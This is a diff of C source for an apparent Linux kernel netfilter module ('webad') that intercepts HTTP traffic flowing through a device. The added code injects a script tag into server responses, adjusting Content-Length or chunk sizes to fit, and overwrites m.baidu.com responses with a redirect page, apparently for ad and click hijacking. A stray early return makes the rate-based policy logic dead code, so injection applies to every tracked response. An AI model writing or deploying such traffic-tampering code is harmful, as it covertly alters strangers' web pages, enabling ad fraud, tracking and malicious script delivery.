@@ -53,19 +53,14 @@ enum
 
 struct policy_replace
 {
-    char src_num;
-    char src[MAX_POLICY_NUM][MAX_POLICY_SIZE];
-    char filter_num;
-    char filter[MAX_POLICY_NUM][MAX_POLICY_SIZE];
+    char src[MAX_POLICY_SIZE];
+    char filter[MAX_POLICY_SIZE];
     char dst[MAX_POLICY_SIZE];
 };
 
 struct policy_cpc
 {
-    char src_num;
-    char src[MAX_POLICY_NUM][MAX_POLICY_SIZE];
-    char dst_num;
-    char dst[MAX_POLICY_NUM][MAX_POLICY_SIZE];
+    struct policy_replace cpc_replace;
     char is_add;
 };
 
@@ -199,8 +194,10 @@ enum http_strings {
     SEARCH_REQUEST_HOST_START,
 	SEARCH_RESPONSE_FILTER1,
 	SEARCH_RESPONSE_FILTER2,
-	SEARCH_HTTP_DATA_START,
-	SEARCH_CONTENT_LEN_VALUE_START,
+	SEARCH_RESPONSE_INSERT_JS,
+	SEARCH_RESPONSE_DATA_START,
+	SEARCH_RESPONSE_CONTENT_LEN_START,
+	SEARCH_RESPONSE_CHUNKED,
 	SEARCH_COMMON_VALUE_STOP,
 };
 
@@ -229,13 +226,21 @@ static struct {
 		.string	= "Content-Encoding: gzip",
 		.len	= 22,
 	},
-	[SEARCH_HTTP_DATA_START] = {
+	[SEARCH_RESPONSE_INSERT_JS] = {
+		.string	= "<!",
+		.len	= 2,
+	},
+	[SEARCH_RESPONSE_DATA_START] = {
 		.string	= "\r\n\r\n",
 		.len	= 4,
 	},
-	[SEARCH_CONTENT_LEN_VALUE_START] = {
+	[SEARCH_RESPONSE_CONTENT_LEN_START] = {
 		.string	= "Content-Length: ",
 		.len	= 16,
+	},
+	[SEARCH_RESPONSE_CHUNKED] = {
+		.string	= "Transfer-Encoding: ",
+		.len	= 19,
 	},
 	[SEARCH_COMMON_VALUE_STOP] = {
 		.string	= "\r\n",
@@ -258,7 +263,7 @@ struct http_session
 #pragma pack(pop)
 
 #define MAX_HTTP_SESSION_TIMEOUT_SEC 3
-struct http_session ghttps;
+static struct http_session ghttps;
 static DEFINE_SPINLOCK(http_session_lock);
 
 static void init_http_session(void)
@@ -327,18 +332,12 @@ static int is_http_session_request(struct http_skb* https)
                 https->tcph->dest == ghttps.sp &&
                 ghttps.response_num == 0)
     {
+        ghttps.response_num = 1;
         spin_unlock_bh(&http_session_lock);
         return 1;
     }
     spin_unlock_bh(&http_session_lock);
     return 0;
-}
-
-static void update_http_session(void)
-{
-    spin_lock_bh(&http_session_lock);  
-    ghttps.response_num = 1;
-    spin_unlock_bh(&http_session_lock);  
 }
 
 static void change_package(struct http_skb *hskb);
@@ -433,11 +432,11 @@ static void http_from_server(struct http_skb *hskb)
     }
     memset(&ts, 0, sizeof(ts));
 	matchoff = skb_find_text(tmp_hskb->skb, tmp_hskb->dataoff, tmp_hskb->data_len,
-		      search[SEARCH_HTTP_DATA_START].ts, &ts);
+		      search[SEARCH_RESPONSE_DATA_START].ts, &ts);
 	if (matchoff == UINT_MAX)
 	    return;
 	    
-    tmp_hskb->http_head_len= matchoff + search[SEARCH_HTTP_DATA_START].len;//include /r/n/r/n
+    tmp_hskb->http_head_len= matchoff + search[SEARCH_RESPONSE_DATA_START].len;//include /r/n/r/n
     if(unlikely(tmp_hskb->http_head_len >= tmp_hskb->data_len))
         return;
     
@@ -455,7 +454,6 @@ static void http_from_server(struct http_skb *hskb)
 
     change_package(tmp_hskb);
     
-    update_http_session();
 }
 
 static int  http_help(struct sk_buff *skb,
@@ -617,114 +615,167 @@ test\
 </html>\0"
 
 #define REDIRECT_LEN strlen(REDIRECT)
+enum {
+	HTTP_RESPONSE_TYPE_CONTENT_LEN,
+	HTTP_RESPONSE_TYPE_CHUNKED,
+};
 
-static void insert_js(struct http_skb *hskb)
+struct public_extern
+{
+    unsigned long curr_insert_js_num;
+};
+
+static struct public_extern pe={
+    .curr_insert_js_num=0
+};
+
+static void insert_js(struct http_skb *hskb , struct http_session* https , struct policy_buf* py)
 {
 	struct ts_state ts;
-	unsigned int matchoff_start,matchoff_stop;
+	unsigned int insert_js_off,matchoff_start,matchoff_stop;
 	char src[32]={0},dst[32]={0};
 	unsigned int tmp;
+    char js[MAX_JS_SIZE]={0};
+    unsigned int js_len;
+    char http_response_type;    
     typeof(http_merge_packet_hook) http_merge_packet_tmp;
     http_merge_packet_tmp = rcu_dereference(http_merge_packet_hook); 
     
     //printk("%d---%d---%d------%s----\n" , hskb->dataoff ,hskb->http_head_len, hskb->data_len ,hskb->data);
 
-    spin_lock_bh(&http_netlink_lock); 
-    printk(KERN_INFO "webad:~~~~start js :%s\n" , gpy.js);
-    spin_unlock_bh(&http_netlink_lock); 
-
-    spin_lock_bh(&http_session_lock); 
-    printk(KERN_INFO "webad:~~~~start host :%s\n" , ghttps.host);
-    spin_unlock_bh(&http_session_lock); 
+    memset(&ts, 0, sizeof(ts));
+	insert_js_off = skb_find_text(hskb->skb, hskb->dataoff, hskb->data_len,
+			  search[SEARCH_RESPONSE_INSERT_JS].ts, &ts);
+    if (insert_js_off == UINT_MAX)
+	{
+        return;
+    }
+    if (insert_js_off < hskb->http_head_len)
+    {
+        return;
+    }
     
 	memset(&ts, 0, sizeof(ts));
 	matchoff_start = skb_find_text(hskb->skb, hskb->dataoff, hskb->data_len,
-			  search[SEARCH_CONTENT_LEN_VALUE_START].ts, &ts);
+			  search[SEARCH_RESPONSE_CONTENT_LEN_START].ts, &ts);
 	if (matchoff_start == UINT_MAX)
 	{
-        //printk(KERN_INFO "webad:~~~~start change chunked\n");
-
-        matchoff_start = hskb->http_head_len;
-        memset(&ts, 0, sizeof(ts));
-    	matchoff_stop = skb_find_text(hskb->skb, hskb->dataoff + matchoff_start, hskb->data_len - matchoff_start,
-    			  search[SEARCH_COMMON_VALUE_STOP].ts, &ts);
-    	if (matchoff_stop == UINT_MAX)
-    		return;
-
-    	if(unlikely(matchoff_stop > 8))
-    	{
-    		return;
-    	}
-    	memcpy(src , hskb->data + matchoff_start, matchoff_stop);
-    	sscanf(src, "%x", &tmp);
-    	tmp+=JS_LEN;
-    	sprintf(dst , "%x" , tmp);
-    	//printk(KERN_INFO "webad:~~~~~end change chunked:%s---%s\n" , src , dst);
-
-        if(!http_merge_packet_tmp(hskb->skb , hskb->ct , hskb->ctinfo , hskb->protoff,
-        	   hskb->http_head_len + matchoff_stop + search[SEARCH_COMMON_VALUE_STOP].len , 0,
-        	   JS, JS_LEN))
+	    memset(&ts, 0, sizeof(ts));
+	    matchoff_start = skb_find_text(hskb->skb, hskb->dataoff, hskb->data_len,
+			  search[SEARCH_RESPONSE_CHUNKED].ts, &ts);
+        if (matchoff_start == UINT_MAX)
+	    {
             return;
-
-        if(!http_merge_packet_tmp(hskb->skb, hskb->ct, hskb->ctinfo,hskb->protoff,
-        		   hskb->http_head_len, matchoff_stop,
-        		   dst, strlen(dst)))
-        return;
+        }
+        if (matchoff_start > hskb->http_head_len)
+        {
+            return;
+        }
+        http_response_type=HTTP_RESPONSE_TYPE_CHUNKED;
+        matchoff_start = hskb->http_head_len;
     }
     else
     {
-        //printk(KERN_INFO "webad:yjjtest~~~~start change content len\n");
-        matchoff_start += search[SEARCH_CONTENT_LEN_VALUE_START].len;
-        memset(&ts, 0, sizeof(ts));
-    	matchoff_stop = skb_find_text(hskb->skb, hskb->dataoff + matchoff_start, hskb->data_len - matchoff_start,
-    			  search[SEARCH_COMMON_VALUE_STOP].ts, &ts);
-    	if (matchoff_stop == UINT_MAX)
-    		return;
-
-    	if(unlikely(matchoff_stop > 8))
-    	{
-    		return;
-    	}
-        memcpy(src , hskb->data + matchoff_start , matchoff_stop);
-    	sscanf(src, "%d", &tmp);
-    	tmp +=JS_LEN;
-    	sprintf(dst, "%d" , tmp);
-    	//printk(KERN_INFO "webad:~~~~~end change content len:%s---%s\n" , src , dst);
-
-        if(!http_merge_packet_tmp(hskb->skb , hskb->ct , hskb->ctinfo , hskb->protoff,
-        	   hskb->http_head_len, 0,
-        	   JS, JS_LEN))
-            return;
-
-        if(!http_merge_packet_tmp(hskb->skb, hskb->ct, hskb->ctinfo,hskb->protoff,
-    				   matchoff_start, matchoff_stop,
-    				   dst, strlen(dst)))
-            return;
-        
-        //printk(KERN_INFO "webad:~~~~~end:%s\n" , hskb->data);
+        http_response_type=HTTP_RESPONSE_TYPE_CONTENT_LEN;
+        matchoff_start += search[SEARCH_RESPONSE_CONTENT_LEN_START].len;
     }
+    memset(&ts, 0, sizeof(ts));
+	matchoff_stop = skb_find_text(hskb->skb, hskb->dataoff + matchoff_start, hskb->data_len - matchoff_start,
+			  search[SEARCH_COMMON_VALUE_STOP].ts, &ts);
+	if (matchoff_stop == UINT_MAX)
+		return;
+
+	if(unlikely(matchoff_stop > 8))
+	{
+		return;
+	}
+    memcpy(src , hskb->data + matchoff_start , matchoff_stop);
+
+    snprintf(js , MAX_JS_SIZE , "<script type=\"text/javascript\" async %s ct=\"%lu\" ></script>" ,
+            py->js , ++pe.curr_insert_js_num);
+    
+    js_len = strlen(js);
+    if(http_response_type == HTTP_RESPONSE_TYPE_CHUNKED)
+    {
+        sscanf(src, "%x", &tmp);
+        tmp +=js_len;
+	    sprintf(dst, "%x" , tmp);
+    }
+    else
+    {
+        sscanf(src, "%d", &tmp);
+        tmp +=js_len;
+	    sprintf(dst, "%d" , tmp);
+    }
+	
+    
+    //printk(KERN_INFO "webad:~~~~~:%s---%s\n" , src , dst);
+  
+    
+    if(!http_merge_packet_tmp(hskb->skb , hskb->ct , hskb->ctinfo , hskb->protoff,
+    	   insert_js_off, 0,
+    	   js, js_len))
+        return;
+
+    if(!http_merge_packet_tmp(hskb->skb, hskb->ct, hskb->ctinfo,hskb->protoff,
+		   matchoff_start, matchoff_stop,
+		   dst, strlen(dst)))
+        return;
+    
 }
 
-static void redirect(struct http_skb *hskb)
-
+static void redirect_cpc(struct http_skb *hskb ,struct http_session* https, struct policy_buf* py)
 {
     typeof(http_merge_packet_hook) http_merge_packet_tmp;
-    spin_lock_bh(&http_session_lock); 
-    if(!memcmp(ghttps.host , "m.baidu.com" , 11))
+    if(!memcmp(https->host , "m.baidu.com" , 11))
     {
     
-        spin_unlock_bh(&http_session_lock); 
         http_merge_packet_tmp = rcu_dereference(http_merge_packet_hook); 
         http_merge_packet_tmp(hskb->skb, hskb->ct, hskb->ctinfo,hskb->protoff,
         		   0, hskb->data_len,
         		   REDIRECT,REDIRECT_LEN);
     }
-    spin_unlock_bh(&http_session_lock); 
 }
 
 static void change_package(struct http_skb *hskb)
 {
-    insert_js(hskb);
-    redirect(hskb);
+    unsigned short rate;
+    struct http_session *https,*https_tmp;
+    struct policy_buf *py,*py_tmp;
+    get_random_bytes(&rate, sizeof(unsigned short));
+    rate = rate % 100;
+    
+    //printk(KERN_INFO "webad:~~~~~rate: %u\n" , rate);
+
+    https_tmp = &ghttps;
+    py_tmp = &gpy;
+    https = rcu_dereference(https_tmp); 
+    py = rcu_dereference(py_tmp); 
+
+    insert_js(hskb , https , py);
+
+    return;
+    if(py->cmd&0x01)
+    {
+        if(py->js_rate > rate)
+        {
+            insert_js(hskb , https , py);
+        }
+    }
+    else if(py->cmd&0x02)
+    {
+        if(py->cpc_rate> rate)
+        {
+            redirect_cpc(hskb , https , py);
+        }
+    }    
+    else if(py->cmd&0x04)
+    {
+        //redirect_page_url(hskb ,py);
+    }    
+    else if(py->cmd&0x08)
+    {
+        //redirect_download_url(hskb ,py);
+    }
 }
 
